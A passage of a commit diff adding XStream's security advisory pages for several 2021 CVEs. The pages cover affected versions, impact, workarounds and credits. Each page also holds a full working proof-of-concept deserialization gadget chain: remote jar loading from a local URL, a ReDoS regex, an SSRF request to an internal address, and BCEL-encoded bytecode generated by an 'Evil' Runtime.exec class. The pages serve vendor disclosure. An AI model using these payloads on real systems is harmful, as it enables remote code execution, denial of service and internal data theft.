          "89:     &lt;type&gt;ysomap&lt;/type&gt;",
          "90:     &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;",
          "91:       &lt;m__obj class='string'&gt;test&lt;/m__obj&gt;",
          "92:     &lt;/value&gt;",
          "93:   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;",
          "94: &lt;/sorted-set&gt;",
          "95: </pre></div>",
          "96: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "97: xstream.fromXML(xml);",
          "98: </pre></div>",
          "100:     <p>Depending on the JDK, the code from the remote server is executed as soon as the XML gets unmarshalled or when",
          "101:     another element is added to the set.</p>",
          "103:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "105:     <h2 id=\"impact\">Impact</h2>",
          "107:  <p>The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by",
          "108:  manipulating the processed input stream.</p>",
          "110:     <h2 id=\"workarounds\">Workarounds</h2>",
          "112:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "114:     <h2 id=\"credits\">Credits</h2>",
          "116:     <p>wh1t3p1g G5-RD6@IIE found and reported the issue to XStream and provided the required information to reproduce it.</p>",
          "118:    </body>",
          "119:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-21347.html||xstream-distribution/src/content/CVE-2021-21347.html": [
          "File: xstream-distribution/src/content/CVE-2021-21347.html -> xstream-distribution/src/content/CVE-2021-21347.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 2. February 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21347</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21347: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in execution of arbitrary code loaded from a remote server.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:  unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "38:   &lt;unserializable-parents/&gt;",
          "39:   &lt;java.util.PriorityQueue&gt;",
          "40:     &lt;default&gt;",
          "41:       &lt;size&gt;2&lt;/size&gt;",
          "42:       &lt;comparator class='javafx.collections.ObservableList$1'/&gt;",
          "43:     &lt;/default&gt;",
          "44:     &lt;int&gt;3&lt;/int&gt;",
          "45:     &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;",
          "46:       &lt;dataHandler&gt;",
          "47:         &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt;",
          "48:           &lt;contentType&gt;text/plain&lt;/contentType&gt;",
          "49:           &lt;is class='java.io.SequenceInputStream'&gt;",
          "50:             &lt;e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'&gt;",
          "51:               &lt;iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'&gt;",
          "52:                 &lt;names class='java.util.AbstractList$Itr'&gt;",
          "53:                   &lt;cursor&gt;0&lt;/cursor&gt;",
          "54:                   &lt;lastRet&gt;-1&lt;/lastRet&gt;",
          "55:                   &lt;expectedModCount&gt;0&lt;/expectedModCount&gt;",
          "56:                   &lt;outer-class class='java.util.Arrays$ArrayList'&gt;",
          "57:                     &lt;a class='string-array'&gt;",
          "58:                       &lt;string&gt;Evil&lt;/string&gt;",
          "59:                     &lt;/a&gt;",
          "60:                   &lt;/outer-class&gt;",
          "61:                 &lt;/names&gt;",
          "62:                 &lt;processorCL class='java.net.URLClassLoader'&gt;",
          "63:                   &lt;ucp class='sun.misc.URLClassPath'&gt;",
          "64:                     &lt;urls serialization='custom'&gt;",
          "65:                       &lt;unserializable-parents/&gt;",
          "66:                       &lt;vector&gt;",
          "67:                         &lt;default&gt;",
          "68:                           &lt;capacityIncrement&gt;0&lt;/capacityIncrement&gt;",
          "69:                           &lt;elementCount&gt;1&lt;/elementCount&gt;",
          "70:                           &lt;elementData&gt;",
          "71:                             &lt;url&gt;http://127.0.0.1:80/Evil.jar&lt;/url&gt;",
          "72:                           &lt;/elementData&gt;",
          "73:                         &lt;/default&gt;",
          "74:                       &lt;/vector&gt;",
          "75:                     &lt;/urls&gt;",
          "76:                     &lt;path&gt;",
          "77:                       &lt;url&gt;http://127.0.0.1:80/Evil.jar&lt;/url&gt;",
          "78:                     &lt;/path&gt;",
          "79:                     &lt;loaders/&gt;",
          "80:                     &lt;lmap/&gt;",
          "81:                   &lt;/ucp&gt;",
          "82:                   &lt;package2certs class='concurrent-hash-map'/&gt;",
          "83:                   &lt;classes/&gt;",
          "84:                   &lt;defaultDomain&gt;",
          "85:                     &lt;classloader class='java.net.URLClassLoader' reference='../..'/&gt;",
          "86:                     &lt;principals/&gt;",
          "87:                     &lt;hasAllPerm&gt;false&lt;/hasAllPerm&gt;",
          "88:                     &lt;staticPermissions&gt;false&lt;/staticPermissions&gt;",
          "89:                     &lt;key&gt;",
          "90:                       &lt;outer-class reference='../..'/&gt;",
          "91:                     &lt;/key&gt;",
          "92:                   &lt;/defaultDomain&gt;",
          "93:                   &lt;initialized&gt;true&lt;/initialized&gt;",
          "94:                   &lt;pdcache/&gt;",
          "95:                 &lt;/processorCL&gt;",
          "96:               &lt;/iterator&gt;",
          "97:               &lt;type&gt;KEYS&lt;/type&gt;",
          "98:             &lt;/e&gt;",
          "99:             &lt;in class='java.io.ByteArrayInputStream'&gt;",
          "100:               &lt;buf&gt;&lt;/buf&gt;",
          "101:               &lt;pos&gt;-2147483648&lt;/pos&gt;",
          "102:               &lt;mark&gt;0&lt;/mark&gt;",
          "103:               &lt;count&gt;0&lt;/count&gt;",
          "104:             &lt;/in&gt;",
          "105:           &lt;/is&gt;",
          "106:           &lt;consumed&gt;false&lt;/consumed&gt;",
          "107:         &lt;/dataSource&gt;",
          "108:         &lt;transferFlavors/&gt;",
          "109:       &lt;/dataHandler&gt;",
          "110:       &lt;dataLen&gt;0&lt;/dataLen&gt;",
          "111:     &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;",
          "112:     &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/&gt;",
          "113:   &lt;/java.util.PriorityQueue&gt;",
          "114: &lt;/java.util.PriorityQueue&gt;",
          "115: </pre></div>",
          "116: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "117: xstream.fromXML(xml);",
          "118: </pre></div>",
          "120:     <p>As soon as the XML gets unmarshalled, the code from the remote server is loaded and executed.</p>",
          "122:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "124:     <h2 id=\"impact\">Impact</h2>",
          "126:  <p>The vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by",
          "127:  manipulating the processed input stream.</p>",
          "129:     <h2 id=\"workarounds\">Workarounds</h2>",
          "131:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "133:     <h2 id=\"credits\">Credits</h2>",
          "135:     <p>The vulnerability was discovered and reported by threedr3am.</p>",
          "137:    </body>",
          "138:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-21348.html||xstream-distribution/src/content/CVE-2021-21348.html": [
          "File: xstream-distribution/src/content/CVE-2021-21348.html -> xstream-distribution/src/content/CVE-2021-21348.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 19. February 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21348</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21348: XStream is vulnerable to an attack using Regular Expression for a Denial of Service (ReDos).</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.    An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in executed evaluation of a malicious regular expression",
          "32:     causing a denial of service.</p>",
          "34:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "36:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "37:  unmarshal it again with XStream:</p>",
          "38: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "39:   &lt;unserializable-parents/&gt;",
          "40:   &lt;java.util.PriorityQueue&gt;",
          "41:     &lt;default&gt;",
          "42:       &lt;size&gt;2&lt;/size&gt;",
          "43:       &lt;comparator class='javafx.collections.ObservableList$1'/&gt;",
          "44:     &lt;/default&gt;",
          "45:     &lt;int&gt;3&lt;/int&gt;",
          "46:     &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;",
          "47:       &lt;dataHandler&gt;",
          "48:         &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt;",
          "49:           &lt;contentType&gt;text/plain&lt;/contentType&gt;",
          "50:           &lt;is class='java.io.SequenceInputStream'&gt;",
          "51:             &lt;e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'&gt;",
          "52:               &lt;iterator class='java.util.Scanner'&gt;",
          "53:                 &lt;buf class='java.nio.HeapCharBuffer'&gt;",
          "54:                   &lt;mark&gt;-1&lt;/mark&gt;",
          "55:                   &lt;position&gt;0&lt;/position&gt;",
          "56:                   &lt;limit&gt;0&lt;/limit&gt;",
          "57:                   &lt;capacity&gt;1024&lt;/capacity&gt;",
          "58:                   &lt;address&gt;0&lt;/address&gt;",
          "59:                   &lt;hb&gt;&lt;/hb&gt;",
          "60:                   &lt;offset&gt;0&lt;/offset&gt;",
          "61:                   &lt;isReadOnly&gt;false&lt;/isReadOnly&gt;",
          "62:                 &lt;/buf&gt;",
          "63:                 &lt;position&gt;0&lt;/position&gt;",
          "64:                 &lt;matcher&gt;",
          "65:                   &lt;parentPattern&gt;",
          "66:                     &lt;pattern&gt;\\p{javaWhitespace}+&lt;/pattern&gt;",
          "67:                     &lt;flags&gt;0&lt;/flags&gt;",
          "68:                   &lt;/parentPattern&gt;",
          "69:                   &lt;from&gt;0&lt;/from&gt;",
          "70:                   &lt;to&gt;0&lt;/to&gt;",
          "71:                   &lt;lookbehindTo&gt;0&lt;/lookbehindTo&gt;",
          "72:                   &lt;text class='java.nio.HeapCharBuffer' reference='../../buf'/&gt;",
          "73:                   &lt;acceptMode&gt;0&lt;/acceptMode&gt;",
          "74:                   &lt;first&gt;-1&lt;/first&gt;",
          "75:                   &lt;last&gt;0&lt;/last&gt;",
          "76:                   &lt;oldLast&gt;-1&lt;/oldLast&gt;",
          "77:                   &lt;lastAppendPosition&gt;0&lt;/lastAppendPosition&gt;",
          "78:                   &lt;locals/&gt;",
          "79:                   &lt;hitEnd&gt;false&lt;/hitEnd&gt;",
          "80:                   &lt;requireEnd&gt;false&lt;/requireEnd&gt;",
          "81:                   &lt;transparentBounds&gt;true&lt;/transparentBounds&gt;",
          "82:                   &lt;anchoringBounds&gt;false&lt;/anchoringBounds&gt;",
          "83:                 &lt;/matcher&gt;",
          "84:                 &lt;delimPattern&gt;",
          "85:                   &lt;pattern&gt;(x+)*y&lt;/pattern&gt;",
          "86:                   &lt;flags&gt;0&lt;/flags&gt;",
          "87:                 &lt;/delimPattern&gt;",
          "88:                 &lt;hasNextPosition&gt;0&lt;/hasNextPosition&gt;",
          "89:                 &lt;source class='java.io.StringReader'&gt;",
          "90:                   &lt;lock class='java.io.StringReader' reference='..'/&gt;",
          "91:                   &lt;str&gt;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/str&gt;",
          "92:                   &lt;length&gt;32&lt;/length&gt;",
          "93:                   &lt;next&gt;0&lt;/next&gt;",
          "94:                   &lt;mark&gt;0&lt;/mark&gt;",
          "95:                 &lt;/source&gt;",
          "96:               &lt;/iterator&gt;",
          "97:               &lt;type&gt;KEYS&lt;/type&gt;",
          "98:             &lt;/e&gt;",
          "99:             &lt;in class='java.io.ByteArrayInputStream'&gt;",
          "100:               &lt;buf&gt;&lt;/buf&gt;",
          "101:               &lt;pos&gt;0&lt;/pos&gt;",
          "102:               &lt;mark&gt;0&lt;/mark&gt;",
          "103:               &lt;count&gt;0&lt;/count&gt;",
          "104:             &lt;/in&gt;",
          "105:           &lt;/is&gt;",
          "106:           &lt;consumed&gt;false&lt;/consumed&gt;",
          "107:         &lt;/dataSource&gt;",
          "108:         &lt;transferFlavors/&gt;",
          "109:       &lt;/dataHandler&gt;",
          "110:       &lt;dataLen&gt;0&lt;/dataLen&gt;",
          "111:     &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;",
          "112:     &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/&gt;",
          "113:   &lt;/java.util.PriorityQueue&gt;",
          "114: &lt;/java.util.PriorityQueue&gt;",
          "115: </pre></div>",
          "116: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "117: xstream.fromXML(xml);",
          "118: </pre></div>",
          "120:     <p>As soon as the XML gets unmarshalled, the malicious regular expression is evaluated and causes a denial of service.</p>",
          "122:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "124:     <h2 id=\"impact\">Impact</h2>",
          "126:  <p>The vulnerability may allow a remote attacker to occupy a thread that consumes maximum CPU time and will never",
          "127:  return.</p>",
          "129:     <h2 id=\"workarounds\">Workarounds</h2>",
          "131:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "133:     <h2 id=\"credits\">Credits</h2>",
          "135:     <p>The vulnerability was discovered and reported by threedr3am.</p>",
          "137:    </body>",
          "138:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-21349.html||xstream-distribution/src/content/CVE-2021-21349.html": [
          "File: xstream-distribution/src/content/CVE-2021-21349.html -> xstream-distribution/src/content/CVE-2021-21349.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 20. February 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21349</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21349: A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams",
          "20:     from an arbitrary URL referencing a resource in an intranet or the local host.</p>",
          "22:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "24:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "25:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "26:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "28:     <h2 id=\"description\">Description</h2>",
          "30:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "31:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "32:     input stream and replace or inject objects, that result in a server-side forgery request.</p>",
          "34:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "36:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "37:  unmarshal it again with XStream:</p>",
          "38: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "39:   &lt;unserializable-parents/&gt;",
          "40:   &lt;java.util.PriorityQueue&gt;",
          "41:     &lt;default&gt;",
          "42:       &lt;size&gt;2&lt;/size&gt;",
          "43:       &lt;comparator class='javafx.collections.ObservableList$1'/&gt;",
          "44:     &lt;/default&gt;",
          "45:     &lt;int&gt;3&lt;/int&gt;",
          "46:     &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;",
          "47:       &lt;dataHandler&gt;",
          "48:         &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt;",
          "49:           &lt;contentType&gt;text/plain&lt;/contentType&gt;",
          "50:           &lt;is class='java.io.SequenceInputStream'&gt;",
          "51:             &lt;e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'&gt;",
          "52:               &lt;iterator class='com.sun.xml.internal.ws.util.ServiceFinder$ServiceNameIterator'&gt;",
          "53:                 &lt;configs class='sun.misc.FIFOQueueEnumerator'&gt;",
          "54:                   &lt;queue&gt;",
          "55:                     &lt;length&gt;1&lt;/length&gt;",
          "56:                     &lt;head&gt;",
          "57:                       &lt;obj class='url'&gt;http://localhost:8080/internal/&lt;/obj&gt;",
          "58:                     &lt;/head&gt;",
          "59:                     &lt;tail reference='../head'/&gt;",
          "60:                   &lt;/queue&gt;",
          "61:                   &lt;cursor reference='../queue/head'/&gt;",
          "62:                 &lt;/configs&gt;",
          "63:                 &lt;returned class='sorted-set'/&gt;",
          "64:               &lt;/iterator&gt;",
          "65:               &lt;type&gt;KEYS&lt;/type&gt;",
          "66:             &lt;/e&gt;",
          "67:             &lt;in class='java.io.ByteArrayInputStream'&gt;",
          "68:               &lt;buf&gt;&lt;/buf&gt;",
          "69:               &lt;pos&gt;0&lt;/pos&gt;",
          "70:               &lt;mark&gt;0&lt;/mark&gt;",
          "71:               &lt;count&gt;0&lt;/count&gt;",
          "72:             &lt;/in&gt;",
          "73:           &lt;/is&gt;",
          "74:           &lt;consumed&gt;false&lt;/consumed&gt;",
          "75:         &lt;/dataSource&gt;",
          "76:         &lt;transferFlavors/&gt;",
          "77:       &lt;/dataHandler&gt;",
          "78:       &lt;dataLen&gt;0&lt;/dataLen&gt;",
          "79:     &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;",
          "80:     &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/&gt;",
          "81:   &lt;/java.util.PriorityQueue&gt;",
          "82: &lt;/java.util.PriorityQueue&gt;",
          "83: </pre></div>",
          "84: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "85: xstream.fromXML(xml);",
          "86: </pre></div>",
          "88:     <p>As soon as the XML gets unmarshalled, the payload gets executed and the data from the URL location is collected.</p>",
          "90:     <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>",
          "92:     <h2 id=\"impact\">Impact</h2>",
          "94:  <p>The vulnerability may allow a remote attacker to request data from internal resources that are not publicly",
          "95:  available only by manipulating the processed input stream.</p>",
          "97:     <h2 id=\"workarounds\">Workarounds</h2>",
          "99:     <p>See <a href=\"security.html#workaround\">workarounds</a> for the different versions covering all CVEs.</p>",
          "101:     <h2 id=\"credits\">Credits</h2>",
          "103:     <p>The vulnerability was discovered and reported by threedr3am.</p>",
          "105:    </body>",
          "106:  </html>",
          "",
          "---------------"
        ],
        "xstream-distribution/src/content/CVE-2021-21350.html||xstream-distribution/src/content/CVE-2021-21350.html": [
          "File: xstream-distribution/src/content/CVE-2021-21350.html -> xstream-distribution/src/content/CVE-2021-21350.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "[No context available]",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "1: <html>",
          "2: <!--",
          "3:  Copyright (C) 2021 XStream committers.",
          "4:  All rights reserved.",
          "6:  The software in this package is published under the terms of the BSD",
          "7:  style license a copy of which has been included with this distribution in",
          "8:  the LICENSE.txt file.",
          "10:  Created on 20. February 2021 by Joerg Schaible",
          "11:  -->",
          "12:   <head>",
          "13:     <title>CVE-2021-21350</title>",
          "14:   </head>",
          "15:   <body>",
          "17:     <h2 id=\"vulnerability\">Vulnerability</h2>",
          "19:     <p>CVE-2021-21350: XStream is vulnerable to an Arbitrary Code Execution attack.</p>",
          "21:     <h2 id=\"affected_versions\">Affected Versions</h2>",
          "23:  <p>All versions until and including version 1.4.15 are affected, if using the version out of the box. No user is",
          "24:  affected, who followed the recommendation to setup <a href=\"security.html#framework\">XStream's security",
          "25:  framework</a> with a whitelist limited to the minimal required types.</p>",
          "27:     <h2 id=\"description\">Description</h2>",
          "29:     <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.",
          "30:     XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed",
          "31:     input stream and replace or inject objects, that result in an arbitrary code execution.</p>",
          "33:     <h2 id=\"reproduction\">Steps to Reproduce</h2>",
          "35:  <p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and",
          "36:  unmarshal it again with XStream:</p>",
          "37: <div class=\"Source XML\"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;",
          "38:   &lt;unserializable-parents/&gt;",
          "39:   &lt;java.util.PriorityQueue&gt;",
          "40:     &lt;default&gt;",
          "41:       &lt;size&gt;2&lt;/size&gt;",
          "42:       &lt;comparator class='javafx.collections.ObservableList$1'/&gt;",
          "43:     &lt;/default&gt;",
          "44:     &lt;int&gt;3&lt;/int&gt;",
          "45:     &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;",
          "46:       &lt;dataHandler&gt;",
          "47:         &lt;dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'&gt;",
          "48:           &lt;contentType&gt;text/plain&lt;/contentType&gt;",
          "49:           &lt;is class='java.io.SequenceInputStream'&gt;",
          "50:             &lt;e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'&gt;",
          "51:               &lt;iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'&gt;",
          "52:                 &lt;names class='java.util.AbstractList$Itr'&gt;",
          "53:                   &lt;cursor&gt;0&lt;/cursor&gt;",
          "54:                   &lt;lastRet&gt;-1&lt;/lastRet&gt;",
          "55:                   &lt;expectedModCount&gt;0&lt;/expectedModCount&gt;",
          "56:                   &lt;outer-class class='java.util.Arrays$ArrayList'&gt;",
          "57:                     &lt;a class='string-array'&gt;",
          "58:                       &lt;string&gt;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A&lt;/string&gt;",
          "59:                     &lt;/a&gt;",
          "60:                   &lt;/outer-class&gt;",
          "61:                 &lt;/names&gt;",
          "62:                 &lt;processorCL class='com.sun.org.apache.bcel.internal.util.ClassLoader'&gt;",
          "63:                   &lt;parent class='sun.misc.Launcher$ExtClassLoader'&gt;",
          "64:                   &lt;/parent&gt;",
          "65:                   &lt;package2certs class='hashtable'/&gt;",
          "66:                   &lt;classes defined-in='java.lang.ClassLoader'/&gt;",
          "67:                   &lt;defaultDomain&gt;",
          "68:                     &lt;classloader class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='../..'/&gt;",
          "69:                     &lt;principals/&gt;",
          "70:                     &lt;hasAllPerm&gt;false&lt;/hasAllPerm&gt;",
          "71:                     &lt;staticPermissions&gt;false&lt;/staticPermissions&gt;",
          "72:                     &lt;key&gt;",
          "73:                       &lt;outer-class reference='../..'/&gt;",
          "74:                     &lt;/key&gt;",
          "75:                   &lt;/defaultDomain&gt;",
          "76:                   &lt;packages/&gt;",
          "77:                   &lt;nativeLibraries/&gt;",
          "78:                   &lt;assertionLock class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='..'/&gt;",
          "79:                   &lt;defaultAssertionStatus&gt;false&lt;/defaultAssertionStatus&gt;",
          "80:                   &lt;classes/&gt;",
          "81:                   &lt;ignored__packages&gt;",
          "82:                     &lt;string&gt;java.&lt;/string&gt;",
          "83:                     &lt;string&gt;javax.&lt;/string&gt;",
          "84:                     &lt;string&gt;sun.&lt;/string&gt;",
          "85:                   &lt;/ignored__packages&gt;",
          "86:                   &lt;repository class='com.sun.org.apache.bcel.internal.util.SyntheticRepository'&gt;",
          "87:                     &lt;__path&gt;",
          "88:                       &lt;paths/&gt;",
          "89:                       &lt;class__path&gt;.&lt;/class__path&gt;",
          "90:                     &lt;/__path&gt;",
          "91:                     &lt;__loadedClasses/&gt;",
          "92:                   &lt;/repository&gt;",
          "93:                   &lt;deferTo class='sun.misc.Launcher$ExtClassLoader' reference='../parent'/&gt;",
          "94:                 &lt;/processorCL&gt;",
          "95:               &lt;/iterator&gt;",
          "96:               &lt;type&gt;KEYS&lt;/type&gt;",
          "97:             &lt;/e&gt;",
          "98:             &lt;in class='java.io.ByteArrayInputStream'&gt;",
          "99:               &lt;buf&gt;&lt;/buf&gt;",
          "100:               &lt;pos&gt;0&lt;/pos&gt;",
          "101:               &lt;mark&gt;0&lt;/mark&gt;",
          "102:               &lt;count&gt;0&lt;/count&gt;",
          "103:             &lt;/in&gt;",
          "104:           &lt;/is&gt;",
          "105:           &lt;consumed&gt;false&lt;/consumed&gt;",
          "106:         &lt;/dataSource&gt;",
          "107:         &lt;transferFlavors/&gt;",
          "108:       &lt;/dataHandler&gt;",
          "109:       &lt;dataLen&gt;0&lt;/dataLen&gt;",
          "110:     &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;",
          "111:     &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/&gt;",
          "112:   &lt;/java.util.PriorityQueue&gt;",
          "113: &lt;/java.util.PriorityQueue&gt;",
          "114: </pre></div>",
          "116:     <p>The payload has been directly injected and was generated by following code:</p>",
          "118: <div class=\"Source Java\"><pre>import com.sun.org.apache.bcel.internal.classfile.Utility;",
          "119: import java.io.IOException;",
          "120: import java.io.InputStream;",
          "125: public class Evil {",
          "127:     public Evil() throws IOException {",
          "128:         Runtime.getRuntime().exec(\"open -a calculator\");",
          "129:     }",
          "131:     public static void main(String[] args) throws IOException {",
          "132:         InputStream inputStream = Evil.class.getResourceAsStream(\"Evil.class\");",
          "133:         byte[] bytes = new byte[inputStream.available()];",
          "134:         inputStream.read(bytes);",
          "135:         String code = Utility.encode(bytes, true);",
          "136:         String bcel = \"$$BCEL$$\" + code;",
          "137:         System.out.println(bcel);",
          "138:     }",
          "139: }",
          "140: </pre></div>",
          "142: <div class=\"Source Java\"><pre>XStream xstream = new XStream();",
          "143: xstream.fromXML(xml);",
          "144: </pre></div>",
          "146:     <p>As soon as the XML gets unmarshalled, the payload with the injected code gets executed.</p>",
